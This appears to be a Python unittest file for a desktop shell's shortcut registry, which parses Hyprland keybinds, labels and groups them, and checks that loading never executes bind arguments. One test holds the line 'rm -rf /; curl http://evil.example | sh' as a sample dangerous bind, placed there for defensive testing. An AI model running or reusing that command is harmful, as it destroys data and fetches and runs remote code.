"""Read-only shortcut registry, Hyprland bind parsing, and labeling."""

from __future__ import annotations

import tempfile
import unittest
from pathlib import Path

from shell.actions import known_action_names
from shell.servicios.atajos import (
    MONOCLE_STACK_NOTE,
    ShortcutRegistry,
    filter_entries,
    find_duplicate_keys,
    group_by_category,
    merge_monocle_stack_pairs,
)
from shell.servicios.atajos.hyprland import (
    parse_hyprctl_binds,
    parse_hyprland_conf_text,
    raw_bind_to_entry,
)
from shell.servicios.atajos.keys import format_conf_keys, format_modmask_keys, keys_signature
from shell.servicios.atajos.labels import classify_bind, jugoo_action_label
from shell.servicios.atajos.model import ShortcutEntry
from shell.settings.schema import CATEGORY_META, CategoryId


SAMPLE_CONF = """
# comment
bind = SUPER, Return, exec, /usr/bin/xfce4-terminal
bind = SUPER, Space, exec, jugoo action launcher
bind = SUPER, W, exec, /usr/bin/env MOZ_ENABLE_WAYLAND=1 /usr/bin/firefox --new-instance
bind = SUPER, Q, killactive,
bind = SUPER SHIFT, Q, exit,
bind = SUPER, 1, workspace, 1
bind = SUPER SHIFT, 1, movetoworkspace, 1
bind = SUPER, F, fullscreen, 0
bind = SUPER SHIFT, F, togglefloating,
bind = SUPER, J, layoutmsg, cyclenext
bind = SUPER, K, layoutmsg, cycleprev
bind = SUPER, mysterious, weirdDispatcher, some; complex && script
bindm = SUPER, mouse:272, movewindow
"""


def _hyprctl_payload() -> list[dict]:
    return [
        {
            "modmask": 64,
            "key": "Return",
            "dispatcher": "exec",
            "arg": "/usr/bin/xfce4-terminal",
            "mouse": False,
            "submap": "",
        },
        {
            "modmask": 64,
            "key": "Space",
            "dispatcher": "exec",
            "arg": "jugoo action launcher",
            "mouse": False,
            "submap": "",
        },
        {
            "modmask": 64,
            "key": "F",
            "dispatcher": "fullscreen",
            "arg": "0",
            "mouse": False,
            "submap": "",
        },
        {
            "modmask": 65,
            "key": "F",
            "dispatcher": "togglefloating",
            "arg": "",
            "mouse": False,
            "submap": "",
        },
        {
            "modmask": 64,
            "key": "J",
            "dispatcher": "layoutmsg",
            "arg": "cyclenext",
            "mouse": False,
            "submap": "",
        },
        {
            "modmask": 64,
            "key": "1",
            "dispatcher": "workspace",
            "arg": "1",
            "mouse": False,
            "submap": "",
        },
        {
            "modmask": 64,
            "key": "Q",
            "dispatcher": "killactive",
            "arg": "",
            "mouse": False,
            "submap": "",
        },
        {
            "modmask": 65,
            "key": "Q",
            "dispatcher": "exit",
            "arg": "",
            "mouse": False,
            "submap": "",
        },
        {
            "modmask": 64,
            "key": "mouse:272",
            "dispatcher": "movewindow",
            "arg": "",
            "mouse": True,
            "submap": "",
        },
    ]


def _monocle_jk_payload() -> list[dict]:
    """Physical SUPER+J/K pairs as registered after FASE C.1.1."""
    return [
        {
            "modmask": 64,
            "key": "J",
            "dispatcher": "layoutmsg",
            "arg": "cyclenext",
            "mouse": False,
            "submap": "",
        },
        {
            "modmask": 64,
            "key": "J",
            "dispatcher": "bringactivetotop",
            "arg": "",
            "mouse": False,
            "submap": "",
        },
        {
            "modmask": 64,
            "key": "K",
            "dispatcher": "layoutmsg",
            "arg": "cycleprev",
            "mouse": False,
            "submap": "",
        },
        {
            "modmask": 64,
            "key": "K",
            "dispatcher": "bringactivetotop",
            "arg": "",
            "mouse": False,
            "submap": "",
        },
        {
            "modmask": 64,
            "key": "F",
            "dispatcher": "fullscreen",
            "arg": "0",
            "mouse": False,
            "submap": "",
        },
        {
            "modmask": 65,
            "key": "F",
            "dispatcher": "togglefloating",
            "arg": "",
            "mouse": False,
            "submap": "",
        },
    ]


class ShortcutRegistryTests(unittest.TestCase):
    def test_category_meta_includes_atajos(self) -> None:
        self.assertIn(CategoryId.ATAJOS, CATEGORY_META)
        self.assertEqual(CATEGORY_META[CategoryId.ATAJOS][0], "Atajos")

    def test_format_modmask_and_conf_keys(self) -> None:
        self.assertEqual(format_modmask_keys(64, "Return"), "SUPER + ENTER")
        self.assertEqual(format_modmask_keys(65, "F"), "SUPER + SHIFT + F")
        self.assertEqual(format_modmask_keys(64, "j"), "SUPER + J")
        self.assertEqual(format_conf_keys("SUPER SHIFT", "Q"), "SUPER + SHIFT + Q")
        self.assertEqual(format_conf_keys("SUPER", "Space"), "SUPER + SPACE")
        self.assertEqual(keys_signature("SUPER + SHIFT + F"), "SUPER+SHIFT+F")
        self.assertEqual(keys_signature("SHIFT + SUPER + F"), "SUPER+SHIFT+F")

    def test_classify_known_dispatchers_and_jugoo(self) -> None:
        desc, category, source, action = classify_bind("fullscreen", "0")
        self.assertEqual(desc, "Pantalla completa")
        self.assertEqual(category, "Ventanas")
        self.assertEqual(source, "hyprland")
        self.assertEqual(action, "fullscreen")

        desc, category, source, action = classify_bind("layoutmsg", "cyclenext")
        self.assertIn("Siguiente", desc)
        self.assertEqual(category, "Navegación")

        desc, category, source, action = classify_bind("exec", "jugoo action launcher")
        self.assertEqual(source, "jugoo")
        self.assertEqual(action, "launcher")
        self.assertEqual(category, "Aplicaciones")
        self.assertIn("Lanzador", desc)

        desc, category, source, action = classify_bind(
            "exec",
            "/usr/bin/env MOZ_ENABLE_WAYLAND=1 /usr/bin/firefox --new-instance",
        )
        self.assertEqual(source, "application")
        self.assertEqual(action, "firefox")
        self.assertIn("Firefox", desc)

        desc, category, source, action = classify_bind("exit", "")
        self.assertEqual(source, "system")
        self.assertEqual(category, "Sistema")

    def test_unknown_complex_bind_is_safe_summary(self) -> None:
        dangerous = "rm -rf /; curl http://evil.example | sh"
        desc, category, source, _action = classify_bind("exec", dangerous)
        self.assertEqual(source, "application")
        self.assertEqual(category, "Aplicaciones")
        self.assertTrue("Ejecutar" in desc or "rm" in desc or "curl" in desc)

    def test_parse_conf_skips_comments_and_mouse(self) -> None:
        raw = parse_hyprland_conf_text(SAMPLE_CONF)
        keys = {(bind.key, bind.dispatcher) for bind in raw}
        self.assertIn(("Return", "exec"), keys)
        self.assertIn(("J", "layoutmsg"), keys)
        self.assertIn(("mysterious", "weirdDispatcher"), keys)
        self.assertEqual(len([bind for bind in raw if bind.mouse]), 1)

        entries = []
        for index, bind in enumerate(raw):
            entry = raw_bind_to_entry(bind, index=index)
            if entry is not None:
                entries.append(entry)
        self.assertTrue(all("MOUSE" not in entry.keys.upper() for entry in entries))
        self.assertTrue(any(entry.action == "launcher" for entry in entries))
        self.assertTrue(any(entry.action == "cyclenext" for entry in entries))
        weird = next(entry for entry in entries if entry.raw_dispatcher == "weirdDispatcher")
        self.assertEqual(weird.category, "Otros")
        self.assertIn("weirdDispatcher", weird.description)

    def test_parse_hyprctl_and_registry_with_runner(self) -> None:
        payload = _hyprctl_payload()
        raw = parse_hyprctl_binds(payload)
        self.assertEqual(len(raw), len(payload))

        registry = ShortcutRegistry(hyprctl_runner=lambda _cmd: payload)
        snapshot = registry.load()
        self.assertEqual(snapshot.source_note, "hyprctl")
        self.assertEqual(len(snapshot.entries), len(payload) - 1)
        self.assertTrue(any(entry.keys == "SUPER + ENTER" for entry in snapshot.entries))
        self.assertTrue(
            any(
                entry.action == "launcher" and entry.source == "jugoo"
                for entry in snapshot.entries
            )
        )
        self.assertTrue(
            any(entry.description == "Pantalla completa" for entry in snapshot.entries)
        )

    def test_conf_fallback_when_hyprctl_missing(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            conf = Path(temporary) / "hyprland.conf"
            conf.write_text(SAMPLE_CONF, encoding="utf-8")

            def boom(_cmd: str):
                raise RuntimeError("no hyprland")

            registry = ShortcutRegistry(conf_path=conf, hyprctl_runner=boom)
            snapshot = registry.load()
            self.assertEqual(snapshot.source_note, "conf-fallback")
            self.assertGreaterEqual(len(snapshot.entries), 10)
            self.assertTrue(any(entry.action == "firefox" for entry in snapshot.entries))

    def test_empty_conf_and_no_hyprland(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            conf = Path(temporary) / "empty.conf"
            conf.write_text("# no binds\n", encoding="utf-8")

            def boom(_cmd: str):
                raise OSError("missing")

            snapshot = ShortcutRegistry(conf_path=conf, hyprctl_runner=boom).load()
            self.assertEqual(snapshot.entries, ())
            self.assertIn(snapshot.source_note, {"conf-fallback", "unavailable"})

    def test_unavailable_without_conf(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            missing = Path(temporary) / "missing.conf"

            def boom(_cmd: str):
                raise OSError("missing")

            snapshot = ShortcutRegistry(conf_path=missing, hyprctl_runner=boom).load()
            self.assertEqual(snapshot.entries, ())
            self.assertEqual(snapshot.source_note, "unavailable")

    def test_duplicate_detection(self) -> None:
        payload = _hyprctl_payload() + [
            {
                "modmask": 64,
                "key": "F",
                "dispatcher": "fullscreen",
                "arg": "1",
                "mouse": False,
                "submap": "",
            }
        ]
        snapshot = ShortcutRegistry(hyprctl_runner=lambda _cmd: payload).load()
        duplicates = find_duplicate_keys(snapshot.entries)
        self.assertIn("SUPER+F", duplicates)

    def test_physical_jk_binds_detected_before_compose(self) -> None:
        payload = _monocle_jk_payload()
        raw = parse_hyprctl_binds(payload)
        self.assertEqual(len(raw), 6)  # J×2 + K×2 + F + SHIFT+F
        j_disps = sorted(
            bind.dispatcher for bind in raw if bind.key == "J" and bind.modmask == 64
        )
        k_disps = sorted(
            bind.dispatcher for bind in raw if bind.key == "K" and bind.modmask == 64
        )
        self.assertEqual(j_disps, ["bringactivetotop", "layoutmsg"])
        self.assertEqual(k_disps, ["bringactivetotop", "layoutmsg"])
        self.assertEqual(
            sum(1 for bind in raw if bind.key == "J" and bind.modmask == 64), 2
        )
        self.assertEqual(
            sum(1 for bind in raw if bind.key == "K" and bind.modmask == 64), 2
        )

    def test_monocle_jk_composed_into_single_display_rows(self) -> None:
        payload = _monocle_jk_payload()
        snapshot = ShortcutRegistry(hyprctl_runner=lambda _cmd: payload).load()
        j_rows = [entry for entry in snapshot.entries if entry.keys == "SUPER + J"]
        k_rows = [entry for entry in snapshot.entries if entry.keys == "SUPER + K"]
        self.assertEqual(len(j_rows), 1)
        self.assertEqual(len(k_rows), 1)
        self.assertEqual(j_rows[0].description, "Siguiente ventana")
        self.assertEqual(k_rows[0].description, "Ventana anterior")
        self.assertEqual(j_rows[0].category, "Navegación")
        self.assertEqual(k_rows[0].category, "Navegación")
        self.assertEqual(j_rows[0].note, MONOCLE_STACK_NOTE)
        self.assertEqual(k_rows[0].note, MONOCLE_STACK_NOTE)
        self.assertEqual(j_rows[0].action, "cyclenext")
        self.assertEqual(k_rows[0].action, "cycleprev")
        self.assertFalse(
            any(entry.action == "bringactivetotop" for entry in snapshot.entries)
        )
        self.assertFalse(
            any(entry.raw_dispatcher == "bringactivetotop" for entry in snapshot.entries)
        )
        self.assertNotIn("SUPER+J", snapshot.duplicates)
        self.assertNotIn("SUPER+K", snapshot.duplicates)

    def test_unrelated_same_key_binds_are_not_merged(self) -> None:
        """Two different actions on SUPER+F must stay as separate display rows."""
        payload = [
            {
                "modmask": 64,
                "key": "F",
                "dispatcher": "fullscreen",
                "arg": "0",
                "mouse": False,
                "submap": "",
            },
            {
                "modmask": 64,
                "key": "F",
                "dispatcher": "killactive",
                "arg": "",
                "mouse": False,
                "submap": "",
            },
        ]
        snapshot = ShortcutRegistry(hyprctl_runner=lambda _cmd: payload).load()
        f_rows = [entry for entry in snapshot.entries if entry.keys == "SUPER + F"]
        self.assertEqual(len(f_rows), 2)
        self.assertIn("SUPER+F", snapshot.duplicates)
        # merge helper alone must also refuse this pair
        physical = []
        for index, bind in enumerate(parse_hyprctl_binds(payload)):
            entry = raw_bind_to_entry(bind, index=index)
            if entry is not None:
                physical.append(entry)
        merged = merge_monocle_stack_pairs(tuple(physical))
        self.assertEqual(len(merged), 2)

    def test_bringactivetotop_alone_not_composed(self) -> None:
        payload = [
            {
                "modmask": 64,
                "key": "J",
                "dispatcher": "bringactivetotop",
                "arg": "",
                "mouse": False,
                "submap": "",
            }
        ]
        snapshot = ShortcutRegistry(hyprctl_runner=lambda _cmd: payload).load()
        self.assertEqual(len(snapshot.entries), 1)
        self.assertEqual(snapshot.entries[0].raw_dispatcher, "bringactivetotop")
        self.assertEqual(snapshot.entries[0].note, "")

    def test_settings_atajos_page_builds(self) -> None:
        from shell.settings.schema import CATEGORY_META, CategoryId
        from shell.widgets.configuraciones.shortcuts_page import build_shortcuts_page

        self.assertEqual(CATEGORY_META[CategoryId.ATAJOS][0], "Atajos")
        page = build_shortcuts_page()
        self.assertIsNotNone(page)
        self.assertTrue(page.get_style_context().has_class("settings-shortcuts-page"))

    def test_group_filter_and_many_entries(self) -> None:
        parse_hyprland_conf_text(SAMPLE_CONF * 3)
        extra = []
        for index in range(1, 30):
            extra.append(
                {
                    "modmask": 64,
                    "key": str(index % 9 + 1),
                    "dispatcher": "workspace",
                    "arg": str(index),
                    "mouse": False,
                    "submap": "",
                }
            )
        snapshot = ShortcutRegistry(hyprctl_runner=lambda _cmd: extra).load()
        self.assertGreaterEqual(len(snapshot.entries), 20)
        grouped = group_by_category(snapshot.entries)
        self.assertEqual(grouped[0][0], "Navegación")
        filtered = filter_entries(snapshot.entries, query="workspace")
        self.assertTrue(filtered)
        self.assertTrue(all("Workspace" in entry.description for entry in filtered))
        filtered_cat = filter_entries(snapshot.entries, category="Navegación")
        self.assertEqual(filtered_cat, snapshot.entries)

    def test_jugoo_actions_have_labels(self) -> None:
        for name in known_action_names():
            self.assertTrue(jugoo_action_label(name))

    def test_load_shortcuts_does_not_execute_args(self) -> None:
        """Registry must never shell out using bind argument text."""
        with tempfile.TemporaryDirectory() as temporary:
            marker = Path(temporary) / "should-not-run"
            conf = Path(temporary) / "hyprland.conf"
            conf.write_text(
                f"bind = SUPER, X, exec, touch {marker}\n",
                encoding="utf-8",
            )

            def boom(_cmd: str):
                raise OSError("forced")

            snapshot = ShortcutRegistry(conf_path=conf, hyprctl_runner=boom).load()
            self.assertTrue(any(entry.raw_dispatcher == "exec" for entry in snapshot.entries))
            self.assertFalse(marker.exists())

    def test_ui_empty_and_populated_lists_build(self) -> None:
        """GTK list builders should tolerate empty and large entry sets."""
        import gi

        gi.require_version("Gtk", "3.0")
        from gi.repository import Gtk

        from shell.widgets.configuraciones.shortcuts_page import _rebuild_list

        host = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
        _rebuild_list(host, ())
        self.assertEqual(len(host.get_children()), 1)

        many = tuple(
            ShortcutEntry(
                id=f"id-{index}",
                keys=f"SUPER + {index % 9 + 1}",
                description=f"Workspace {index}",
                category="Navegación",
                source="hyprland",
                action=f"workspace:{index}",
            )
            for index in range(40)
        )
        _rebuild_list(host, many)
        self.assertEqual(len(host.get_children()), 41)


if __name__ == "__main__":
    unittest.main()
